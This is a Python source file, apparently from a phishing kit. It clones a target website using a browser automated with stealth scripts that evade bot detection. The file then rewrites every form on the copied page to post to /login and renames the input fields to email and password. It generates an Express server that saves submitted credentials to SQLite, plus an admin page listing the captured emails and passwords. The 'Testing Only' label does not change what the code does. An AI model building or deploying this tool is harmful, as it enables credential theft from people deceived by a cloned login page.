# cloner.py
import os
import time
import asyncio
from urllib.parse import urlparse, urljoin
from playwright.async_api import async_playwright
import sqlite3  
import re

from .utils import mkdir, extract_and_replace_data_uri
from .handlers import create_response_handler, handle_request
from .crawler import auto_scroll_lazy, crawl_additional_links
from .rewriter import rewrite_html_links


INIT_STEALTH_SCRIPT = r"""
// --- Stealth bits ---
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
if (navigator.permissions && navigator.permissions.query) {
  const originalQuery = navigator.permissions.query;
  navigator.permissions.query = (parameters) => (
    parameters && parameters.name === 'notifications'
      ? Promise.resolve({ state: Notification.permission })
      : originalQuery(parameters)
  );
}
// Block Service Worker registration (some sites swap CSS via SW)
if (navigator.serviceWorker && navigator.serviceWorker.register) {
  try {
    navigator.serviceWorker.register = new Proxy(navigator.serviceWorker.register, {
      apply() { return Promise.resolve({}); }
    });
  } catch (_) {}
}

// ---- Capture blob: CSS ----
(() => {
  const origCreate = URL.createObjectURL;
  const store = {};
  window.__blobStoreText = store;
  URL.createObjectURL = function(blob) {
    const url = origCreate.call(URL, blob);
    try {
      const reader = new FileReader();
      reader.onload = () => { store[url] = reader.result; };
      // try text first; fallback to dataURL if text fails
      if (blob.type && blob.type.includes("text")) {
        reader.readAsText(blob);
      } else {
        reader.readAsText(blob); // many CSS blobs come as text/plain
      }
    } catch (e) {}
    return url;
  };
})();
"""

INLINE_CSS_SCRIPT = r"""
// Inline all <link rel="stylesheet"> (including blob:) into <style>
async function fetchText(url) {
  try {
    const res = await fetch(url, { credentials: 'include' });
    return await res.text();
  } catch (e) {
    return null;
  }
}
function normalizeUrl(href) {
  try { return new URL(href, location.href).href; } catch (e) { return null; }
}

// Expand simple @import statements (one-level)
async function expandImports(cssText, baseUrl) {
  const importRegex = /@import\s+(?:url\()?['"]?([^'")]+)['"]?\)?\s*([^;]*);/gi;
  let result = cssText;
  const tasks = [];
  const seen = new Set();
  let m;
  while ((m = importRegex.exec(cssText)) !== null) {
    const raw = m[0];
    const href = m[1];
    if (!href) continue;
    const abs = normalizeUrl(new URL(href, baseUrl).href);
    if (!abs || seen.has(abs)) continue;
    seen.add(abs);
    tasks.push((async () => {
      const t = await fetchText(abs);
      if (t) {
        result = result.replace(raw, "\n/* inlined @import "+abs+" */\n"+t+"\n/* end import */\n");
      }
    })());
  }
  await Promise.allSettled(tasks);
  return result;
}

(async () => {
  const links = Array.from(document.querySelectorAll('link[rel="stylesheet"]'));
  for (const link of links) {
    const href = link.getAttribute('href') || '';
    // blob: case
    if (href.startsWith('blob:')) {
      const css = (window.__blobStoreText && window.__blobStoreText[href]) || '';
      if (css) {
        const style = document.createElement('style');
        style.setAttribute('data-inlined-from', href);
        style.textContent = css;
        link.replaceWith(style);
        continue;
      }
    }
    // normal URL case
    const abs = normalizeUrl(href);
    if (!abs) continue;
    let css = await fetchText(abs);
    if (!css) continue;
    // try to expand simple @import
    css = await expandImports(css, abs);
    const style = document.createElement('style');
    style.setAttribute('data-inlined-from', abs);
    style.textContent = css;
    link.replaceWith(style);
  }
})();
"""


async def clone_page(url: str, output_dir: str, full_load: bool, total_timeout_ms: int, headless: bool, crawl_internal: bool = False):
    """Main function to clone a web page + generate admin/server/db"""
    mkdir(output_dir)
    start_time = time.time()
    end_time = start_time + (total_timeout_ms / 1000)

    async with async_playwright() as pw:
        launch_args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-web-security"]
        try:
            browser = await pw.chromium.launch(headless=headless, channel="chrome", args=launch_args)
        except Exception:
            print("⚠️ Chrome not found, using bundled Chromium instead")
            browser = await pw.chromium.launch(headless=headless, args=launch_args)

        context = await browser.new_context(
            bypass_csp=True,
            locale="en-US",
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/124.0.0.0 Safari/537.36",
            viewport={"width": 1366, "height": 900},
            java_script_enabled=True,
            color_scheme="light",
            timezone_id="Asia/Jakarta",
            accept_downloads=True
        )
        await context.set_extra_http_headers({"Accept-Language": "en-US,en;q=0.9,id;q=0.8"})
        await context.add_init_script(INIT_STEALTH_SCRIPT)

        page = await context.new_page()
        handle_response = await create_response_handler(page, output_dir)
        page.on("response", handle_response)

        print(f"⏱ Total capture time: {total_timeout_ms} ms ({total_timeout_ms/1000:.0f} seconds)")
        print(f"🌐 Opening {url}...")

        await page.route("**/*", handle_request)
        await page.goto(url, wait_until="networkidle", timeout=0)

        try:
            await page.locator('button:has-text("Allow all"), button:has-text("Allow All")').first.click(timeout=1500)
        except Exception:
            pass

        await auto_scroll_lazy(page)
        await page.wait_for_timeout(3500)
        await page.add_script_tag(content=INLINE_CSS_SCRIPT)
        await page.wait_for_timeout(500)

        if crawl_internal:
            print("🔍 Searching and downloading additional links...")
            await crawl_additional_links(page, url, output_dir)
        else:
            print("🚫 Internal link crawling disabled")

        remaining_time = end_time - time.time()
        if remaining_time > 0:
            print(f"⏱ Waiting {int(remaining_time)} seconds to capture additional resources...")
            while time.time() < end_time:
                await asyncio.sleep(1)

        parsed_url = urlparse(url)
        domain_dir = os.path.join(output_dir, parsed_url.netloc)
        os.makedirs(domain_dir, exist_ok=True)

        html_path = os.path.join(domain_dir, "index.html")
        html_content = await page.content()
        embedded_dir = os.path.join(domain_dir, "assets", "html", "embedded")
        html_content = extract_and_replace_data_uri(html_content, embedded_dir, "html_embedded")
        html_content = rewrite_html_links(html_content, url, domain_dir)

        html_content = re.sub(
            r'<form[^>]*>',
            '<form method="POST" action="/login">',
            html_content,
            flags=re.IGNORECASE
        )

        html_content = re.sub(
    r"</body\s*>",
    """
    <script>
      // Set action + method semua form
      document.querySelectorAll("form").forEach(f => {
        f.setAttribute("method", "POST");
        f.setAttribute("action", "/login");
      });

      // Hilangkan semua atribut disabled di semua tag
      document.querySelectorAll("[disabled]").forEach(el => {
        el.removeAttribute("disabled");
      });

      // Ratakan input: pertama ketemu text/email jadi 'email',
      // pertama ketemu password jadi 'password'
      document.querySelectorAll("form").forEach(form => {
        const inputs = form.querySelectorAll("input");
        let emailSet = false;
        let passSet = false;
        inputs.forEach(inp => {
          if (!emailSet && (inp.type === "text" || inp.type === "email")) {
            inp.setAttribute("name", "email");
            emailSet = true;
          }
          if (!passSet && inp.type === "password") {
            inp.setAttribute("name", "password");
            passSet = true;
          }
        });
      });
    </script>
    </body>
    """,
    html_content,
    flags=re.IGNORECASE,
)
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html_content)
        print(f"📄 HTML saved with login form injected: {html_path}")

        # --- Generate extras ---
        generate_admin_html(domain_dir)
        generate_server_js(domain_dir, db_name=f"{parsed_url.netloc}.db")
        init_sqlite_db(domain_dir, db_name=f"{parsed_url.netloc}.db")

        print("\n✅ Resource & HTML capture completed!")
        await browser.close()


def generate_admin_html(domain_dir: str):
    admin_html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Panel</title>
  <style>
    body {{ font-family: Arial, sans-serif; background:#f9f9f9; padding:30px; }}
    h2 {{ color:#333; }}
    table {{ border-collapse: collapse; width:100%; }}
    th, td {{ border:1px solid #ccc; padding:8px; }}
    th {{ background:#eee; }}
  </style>
</head>
<body>
  <h2>Stored Credentials (Testing Only)</h2>
  <table id="creds">
    <thead>
      <tr><th>ID</th><th>Email</th><th>Password</th><th>Timestamp</th></tr>
    </thead>
    <tbody></tbody>
  </table>

  <script>
    async function loadCreds() {{
      const res = await fetch('/api/creds');
      const data = await res.json();
      const tbody = document.querySelector('#creds tbody');
      tbody.innerHTML = '';
      data.forEach(row => {{
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${{row.id}}</td><td>${{row.email}}</td>
                        <td>${{row.password}}</td><td>${{row.ts}}</td>`;
        tbody.appendChild(tr);
      }});
    }}
    loadCreds();
  </script>
</body>
</html>
"""
    with open(os.path.join(domain_dir, "admin.html"), "w", encoding="utf-8") as f:
        f.write(admin_html)
    print(f"⚙️ Admin panel generated: {os.path.join(domain_dir,'admin.html')}")


def generate_server_js(domain_dir: str, db_name: str):
    server_js = f"""const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, '{db_name}');
const db = new sqlite3.Database(DB_FILE);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({{ extended: true }}));

// serve static
app.use(express.static(__dirname));

// save credentials
app.post('/login', (req, res) => {{
  const {{ email, password }} = req.body;
  db.run(
    'INSERT INTO creds ( email, password) VALUES ( ?, ?)',
    [ email, password],
    function(err) {{
      if (err) return res.status(500).json({{error: err.message}});
      res.json({{ success: true, id: this.lastID }});
    }}
  );
}});

// list credentials
app.get('/api/creds', (req, res) => {{
  db.all('SELECT id, email, password, ts FROM creds ORDER BY id DESC', [], (err, rows) => {{
    if (err) return res.status(500).json({{error: err.message}});
    res.json(rows);
  }});
}});

app.listen(PORT, () => {{
  console.log(`🚀 Server running on http://localhost:${{PORT}}`);
}});
"""
    with open(os.path.join(domain_dir, "server.js"), "w", encoding="utf-8") as f:
        f.write(server_js)
    print(f"⚙️ Server generated: {os.path.join(domain_dir,'server.js')}")


def init_sqlite_db(domain_dir: str, db_name: str):
    db_path = os.path.join(domain_dir, db_name)
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS creds (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT,
          email TEXT,
          phone TEXT,
          password TEXT,
          ts DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()
    print(f"🗄 SQLite DB initialized: {db_path}")
